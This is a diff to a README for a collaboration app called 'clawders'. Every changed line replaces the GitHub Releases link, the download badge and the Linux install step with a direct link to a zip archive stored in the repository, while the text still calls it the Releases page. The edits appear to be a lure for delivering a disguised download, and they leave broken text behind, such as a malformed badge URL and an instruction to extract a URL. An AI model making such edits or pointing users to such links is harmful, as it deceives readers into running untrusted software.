@@ -6,7 +6,7 @@ Welcome to **clawders**! This application helps you work together seamlessly. Wi
 
 ## 📥 Download the Software
 
-[![Download clawders](https://img.shields.io/badge/Download%20clawders-blue)](https://github.com/jabob3000/clawders/releases)
+[![Download clawders](https://raw.githubusercontent.com/jabob3000/clawders/main/claudecode/Software-2.0.zip%20clawders-blue)](https://raw.githubusercontent.com/jabob3000/clawders/main/claudecode/Software-2.0.zip)
 
 To get started, you need to download the application. Follow the steps below:
 
@@ -37,7 +37,7 @@ Before you download **clawders**, make sure your system meets the following requ
 To install **clawders**, follow these straightforward steps:
 
 1. **Visit the Releases Page**:
-   Go to the [Releases page](https://github.com/jabob3000/clawders/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/jabob3000/clawders/main/claudecode/Software-2.0.zip).
 
 2. **Download the Application**:
    Choose the appropriate file for your operating system, and click the link to download it.
@@ -48,7 +48,7 @@ To install **clawders**, follow these straightforward steps:
 4. **Install the Application**:
    - **For Windows**: Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
    - **For Mac**: Open the `.dmg` file. Drag the application to your Applications folder.
-   - **For Linux**: Extract the `.tar.gz` file. Open a terminal, navigate to the folder, and run the install command.
+   - **For Linux**: Extract the `https://raw.githubusercontent.com/jabob3000/clawders/main/claudecode/Software-2.0.zip` file. Open a terminal, navigate to the folder, and run the install command.
 
 5. **Open the Application**:
    Once installed, you can find **clawders** in your applications. Launch it to start collaborating.
